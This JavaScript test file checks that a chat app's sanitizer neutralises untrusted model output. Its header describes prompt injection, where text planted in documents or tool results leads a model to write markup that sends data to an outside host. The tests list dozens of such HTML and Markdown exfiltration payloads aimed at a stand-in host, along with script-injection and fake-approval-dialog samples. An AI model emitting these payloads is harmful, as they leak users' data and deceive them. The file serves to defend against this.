// SPDX-FileCopyrightText: IntraFind Software AG
// SPDX-License-Identifier: LicenseRef-iHub-Apps

/**
 * Model answers (and everything else iHub did not write) are rendered with the profile of
 * `utils/untrustedHtml`: no element or attribute may make the browser fetch from another
 * origin without a click, and the content carries no CSS. Text planted in a document, a web
 * page or a tool result can make a model write any of the markup below; each vector here was
 * seen to send a request to an external host before the profile existed.
 */
import { render } from '@testing-library/react';
import { renderInlineMarkdown, renderMarkdown } from '../../../client/src/config/marked.config';
import StreamingMarkdown from '../../../client/src/features/chat/components/StreamingMarkdown';
import {
  EXTERNAL_IMAGE_LINK_CLASS,
  RENDERED_BY_IHUB_ATTRIBUTE,
  cssLoadsResource,
  isLocalResourceUrl,
  sanitizeUntrustedHtml
} from '../../../client/src/utils/untrustedHtml';
import { transformSourceCitations } from '../../../client/src/utils/sourceCitationTransformer';

const EVIL = 'evil.example';

/** Parse rendered HTML into a detached element for inspection. */
const parse = html => {
  const host = document.createElement('div');
  host.innerHTML = html;
  return host;
};

/** Every URL-valued attribute and CSS text in the markup that names the external host. */
const externalReferences = html => {
  const host = parse(html);
  const found = [];
  host.querySelectorAll('*').forEach(element => {
    for (const { name, value } of Array.from(element.attributes)) {
      // A link only loads on a click; that stays allowed.
      if ((name === 'href' || name === 'title') && element.localName === 'a') continue;
      if (value.includes(EVIL)) found.push(`${element.localName}[${name}]`);
    }
    if (element.localName === 'style' && element.textContent.includes(EVIL)) found.push('style');
  });
  return found;
};

describe('untrusted HTML: nothing loads from another origin without a click', () => {
  const vectors = {
    'Markdown image': `![chart](https://${EVIL}/?d=secret)`,
    'img src': `<img src="https://${EVIL}/a.png?d=secret" alt="Chart">`,
    'protocol-relative img': `<img src="//${EVIL}/a.png">`,
    'backslash img': `<img src="/\\${EVIL}/a.png">`,
    'img srcset': `<img srcset="https://${EVIL}/a.png 1x">`,
    'local img with external srcset': `<img src="/logo.png" srcset="https://${EVIL}/a.png 2x">`,
    'inline style background': `<div style="background:url(https://${EVIL}/bg)">x</div>`,
    'video poster and src': `<video poster="https://${EVIL}/p.png" src="https://${EVIL}/v.mp4"></video>`,
    'audio src': `<audio src="https://${EVIL}/a.mp3" autoplay></audio>`,
    'picture source': `<picture><source srcset="https://${EVIL}/s.webp"><img src="/x.png"></picture>`,
    'svg image': `<svg><image href="https://${EVIL}/i.png"></image></svg>`,
    'svg image xlink': `<svg><image xlink:href="https://${EVIL}/i.png"></image></svg>`,
    'svg feImage': `<svg><filter id="f"><feImage href="https://${EVIL}/f.png"></feImage></filter></svg>`,
    'svg external paint server': `<svg><rect fill="url(https://${EVIL}/p.svg#g)" width="9" height="9"></rect></svg>`,
    'svg escaped paint server': `<svg><rect fill="\\75 rl(https://${EVIL}/p.svg#g)"></rect></svg>`,
    'svg cursor': `<svg><rect cursor="url(https://${EVIL}/c.cur), auto"></rect></svg>`,
    'svg textPath href': `<svg><text><textPath href="https://${EVIL}/p.svg#p">t</textPath></text></svg>`,
    'input type=image': `<input type="image" src="https://${EVIL}/i.png">`,
    'table background': `<table background="https://${EVIL}/t.png"><tr><td>x</td></tr></table>`,
    'td background': `<table><tr><td background="https://${EVIL}/t.png">x</td></tr></table>`,
    'style element @import': `<style>@import "https://${EVIL}/s.css";</style>text`,
    'style element url': `<style>body{background:url(https://${EVIL}/b.png)}</style>text`,
    'svg style element': `<svg><style>rect{fill:url(https://${EVIL}/p.svg#g)}</style></svg>`,
    'link stylesheet': `<link rel="stylesheet" href="https://${EVIL}/s.css">`,
    'link prefetch': `<link rel="prefetch" href="https://${EVIL}/p">`,
    'iframe srcdoc': `<iframe srcdoc="<img src=https://${EVIL}/x>"></iframe>`,
    'iframe src': `<iframe src="https://${EVIL}/f"></iframe>`,
    object: `<object data="https://${EVIL}/o.swf"></object>`,
    embed: `<embed src="https://${EVIL}/e.swf">`,
    'meta refresh': `<meta http-equiv="refresh" content="0;url=https://${EVIL}/">`,
    base: `<base href="https://${EVIL}/">`,
    'link ping': `<a href="https://example.com" ping="https://${EVIL}/ping">x</a>`,
    attributionsrc: `<a href="https://example.com" attributionsrc="https://${EVIL}/r">x</a>`,
    'form action': `<form action="https://${EVIL}/f"><button>Approve</button></form>`,
    'button formaction': `<button formaction="https://${EVIL}/f">Approve</button>`
  };

  test.each(Object.entries(vectors))('%s is neutralised', (_, markdown) => {
    const html = renderMarkdown(markdown);
    expect(externalReferences(html)).toEqual([]);
    expect(
      parse(html).querySelector(
        'style, link, video, audio, source, picture, iframe, object, embed, meta, base, form'
      )
    ).toBeNull();
  });

  test('event handlers, scripts and javascript: links stay blocked', () => {
    const html = renderMarkdown(
      '<img src="/x.png" onerror="alert(1)"><script>alert(2)</script><a href="javascript:alert(3)">x</a>'
    );
    expect(html).not.toMatch(/onerror|<script|javascript:/i);
  });

  test('an image from another site becomes a link to it, named by its alt text and host', () => {
    const host = parse(renderMarkdown(`![Quarterly chart](https://${EVIL}/c.png?d=secret)`));
    expect(host.querySelector('img')).toBeNull();
    const link = host.querySelector(`a.${EXTERNAL_IMAGE_LINK_CLASS}`);
    expect(link).not.toBeNull();
    expect(link.getAttribute('href')).toBe(`https://${EVIL}/c.png?d=secret`);
    expect(link.textContent).toBe(`Quarterly chart (${EVIL})`);
    expect(link.getAttribute('target')).toBe('_blank');
    expect(link.getAttribute('rel')).toBe('noopener noreferrer');
  });

  test('without alt text the link reads as the host', () => {
    const link = parse(renderMarkdown(`<img src="https://${EVIL}/c.png">`)).querySelector('a');
    expect(link.textContent).toBe(EVIL);
  });

  test('an external image inside a link becomes text, not a nested link', () => {
    const host = parse(
      sanitizeUntrustedHtml(
        `<a href="https://example.com/"><img src="https://${EVIL}/c.png" alt="Logo"></a>`
      )
    );
    expect(host.querySelectorAll('a')).toHaveLength(1);
    expect(host.querySelector('a').textContent).toBe(`Logo (${EVIL})`);
  });

  test('an image with a source that is no http(s) URL is dropped, keeping its alt text', () => {
    const host = parse(
      sanitizeUntrustedHtml('<p><img src="ftp://files.example/x.png" alt="Diagram"></p>')
    );
    expect(host.querySelector('img, a')).toBeNull();
    expect(host.textContent).toBe('Diagram');
  });
});

describe('untrusted HTML: no CSS and no borrowed classes', () => {
  test('style attributes and elements are removed even when they load nothing', () => {
    const html = renderMarkdown(
      '<style>.approve-button{display:none}</style><p style="color:red;position:fixed">x</p>'
    );
    expect(html).not.toContain('<style');
    expect(html).not.toContain('style=');
    expect(html).not.toContain('display:none');
  });

  test('content cannot use the app classes or ids to lay a fake dialog over the page', () => {
    const host = parse(
      renderMarkdown(
        '<div class="fixed inset-0 z-50 bg-white" id="tool-approval"><button class="btn-primary">Approve</button></div>'
      )
    );
    expect(host.querySelector('[class]')).toBeNull();
    expect(host.querySelector('[id]')).toBeNull();
  });

  test('a forged renderer marker does not unlock classes', () => {
    const html = renderMarkdown(
      `<div ${RENDERED_BY_IHUB_ATTRIBUTE}="00000000000000000000000000000000" class="fixed inset-0">x</div>`
    );
    expect(parse(html).querySelector('[class]')).toBeNull();
  });

  test('dialogs, popovers and inputs other than task-list checkboxes are removed', () => {
    const host = parse(
      renderMarkdown(
        '<dialog open>Fake</dialog><div popover>p</div><button popovertarget="x">b</button><input type="password">'
      )
    );
    expect(host.querySelector('dialog, input, [popover], [popovertarget]')).toBeNull();
  });
});

describe('untrusted HTML: what answers keep', () => {
  test('same-origin, relative and data: images stay', () => {
    const sources = [
      '/api/files/abc.png',
      'images/chart.png',
      `${window.location.origin}/uploads/logo.png`,
      'data:image/png;base64,iVBORw0KGgo='
    ];
    for (const src of sources) {
      const img = parse(renderMarkdown(`<img src="${src}" alt="ok">`)).querySelector('img');
      expect(img).not.toBeNull();
      expect(img.getAttribute('src')).toBe(src);
    }
  });

  test('code blocks keep their highlighting markup, toolbar and classes', () => {
    const host = parse(renderMarkdown('```js\nconst a = 1;\n```'));
    const block = host.querySelector('.code-block-container');
    expect(block).not.toBeNull();
    expect(block.querySelector('code.language-js')).not.toBeNull();
    expect(block.querySelector('.code-copy-btn svg.w-3\\.5')).not.toBeNull();
    expect(block.querySelector('.code-download-btn')).not.toBeNull();
  });

  test('Mermaid placeholders keep their container, id and token', () => {
    const host = parse(renderMarkdown('```mermaid\nflowchart TD\n  A --> B\n```'));
    const container = host.querySelector('.mermaid-diagram-container');
    expect(container).not.toBeNull();
    expect(container.id).toMatch(/^mermaid-/);
    expect(container.getAttribute('data-mermaid-token')).toMatch(/^[0-9a-f]{32}$/);
    expect(container.querySelector('svg.animate-spin')).not.toBeNull();
  });

  test('tables, task lists, headings and emphasis render', () => {
    const host = parse(
      renderMarkdown('# Title\n\n**bold** _it_\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n- [x] done')
    );
    expect(host.querySelector('h1').textContent).toBe('Title');
    expect(host.querySelector('strong').textContent).toBe('bold');
    expect(host.querySelectorAll('td')).toHaveLength(2);
    const box = host.querySelector('input[type="checkbox"]');
    expect(box).not.toBeNull();
    expect(box.hasAttribute('checked')).toBe(true);
  });

  test('links stay links: external ones open in a new tab, same-origin ones in place', () => {
    const host = parse(renderMarkdown('[out](https://example.com/a) [in](/apps/chat)'));
    const [out, local] = host.querySelectorAll('a');
    expect(out.getAttribute('href')).toBe('https://example.com/a');
    expect(out.getAttribute('target')).toBe('_blank');
    expect(out.getAttribute('rel')).toBe('noopener noreferrer');
    expect(local.getAttribute('href')).toBe('/apps/chat');
    expect(local.hasAttribute('target')).toBe(false);
  });

  test('SVG keeps its shapes, in-document references and links', () => {
    const host = parse(
      renderMarkdown(
        '<svg viewBox="0 0 10 10"><defs><linearGradient id="g"></linearGradient></defs><rect fill="url(#g)" width="5" height="5"></rect><a href="https://example.com"><text>t</text></a></svg>'
      )
    );
    expect(host.querySelector('rect').getAttribute('fill')).toBe('url(#g)');
    expect(host.querySelector('svg a').getAttribute('href')).toBe('https://example.com');
  });

  test('MathML stays', () => {
    const host = parse(renderMarkdown('<math><mi>x</mi><mo>=</mo><mn>2</mn></math>'));
    expect(host.querySelector('math mi').textContent).toBe('x');
  });

  test('citation badges keep their classes', () => {
    const href = 'https://docs.example.com/page';
    const citations = {
      messageKey: 'm1',
      numberOfUrl: url => (url === href ? 1 : 0),
      numberOfMarker: () => 0,
      byNumber: new Map([[1, { url: href, title: 'Page', site: 'docs.example.com' }]])
    };
    const host = parse(
      renderMarkdown(`See [1](${href}).`, {
        transformHtml: html => transformSourceCitations(html, citations)
      })
    );
    expect(host.querySelector('sup.source-citation-ref a.source-citation')).not.toBeNull();
  });

  test('inline Markdown uses the same profile', () => {
    const html = renderInlineMarkdown(`**x** ![i](https://${EVIL}/i.png)`);
    expect(html).toContain('<strong>x</strong>');
    expect(html).not.toContain('<img');
  });
});

describe('trusted (admin-written) Markdown keeps external images and styles', () => {
  test('renderMarkdown with trusted keeps them', () => {
    const html = renderMarkdown(
      `![logo](https://cdn.example.com/logo.png)\n\n<p style="color:red" class="lead">x</p>`,
      { trusted: true }
    );
    const host = parse(html);
    expect(host.querySelector('img').getAttribute('src')).toBe('https://cdn.example.com/logo.png');
    expect(host.querySelector('p.lead').getAttribute('style')).toBe('color:red');
  });

  test('still removes scripts and handlers', () => {
    const html = renderMarkdown('<img src="/x" onerror="alert(1)"><script>x</script>', {
      trusted: true
    });
    expect(html).not.toMatch(/onerror|<script/);
  });
});

describe('helpers', () => {
  test('cssLoadsResource finds loads behind escapes and comments', () => {
    expect(cssLoadsResource('fill:url(#a)')).toBe(false);
    expect(cssLoadsResource('background:url(data:image/png;base64,AA)')).toBe(false);
    expect(cssLoadsResource('color: red')).toBe(false);
    expect(cssLoadsResource('background:url(https://x.example/a)')).toBe(true);
    expect(cssLoadsResource('background:\\75 rl(https://x.example/a)')).toBe(true);
    expect(cssLoadsResource('background:url/**/(https://x.example/a)')).toBe(true);
    expect(cssLoadsResource('@import "a.css"')).toBe(true);
    expect(cssLoadsResource('background-image:image-set("a.png" 1x)')).toBe(true);
    expect(cssLoadsResource('background:url(rel.png)')).toBe(true);
    expect(cssLoadsResource('background:url(rel.png)', { foreignOnly: true })).toBe(false);
    expect(cssLoadsResource('background:url(//x.example/a)', { foreignOnly: true })).toBe(true);
  });

  test('isLocalResourceUrl', () => {
    expect(isLocalResourceUrl('/a.png')).toBe(true);
    expect(isLocalResourceUrl('a.png')).toBe(true);
    expect(isLocalResourceUrl('data:image/gif;base64,R0lGOD')).toBe(true);
    expect(isLocalResourceUrl('data:text/html,<b>x</b>')).toBe(false);
    expect(isLocalResourceUrl('https://x.example/a.png')).toBe(false);
    expect(isLocalResourceUrl('//x.example/a.png')).toBe(false);
    expect(isLocalResourceUrl('/\\x.example/a.png')).toBe(false);
    expect(isLocalResourceUrl('blob:https://x.example/1')).toBe(false);
    expect(isLocalResourceUrl('javascript:alert(1)')).toBe(false);
    expect(isLocalResourceUrl('')).toBe(false);
  });
});

describe('StreamingMarkdown', () => {
  const image = `![chart](https://${EVIL}/c.png?d=secret)`;

  test('renders a model answer with the untrusted profile', () => {
    const { container } = render(<StreamingMarkdown content={image} />);
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector(`a.${EXTERNAL_IMAGE_LINK_CLASS}`)).not.toBeNull();
  });

  test('renders admin-written content (a usage guide) as trusted', () => {
    const { container } = render(<StreamingMarkdown content={image} trusted />);
    expect(container.querySelector('img').getAttribute('src')).toBe(
      `https://${EVIL}/c.png?d=secret`
    );
  });
});
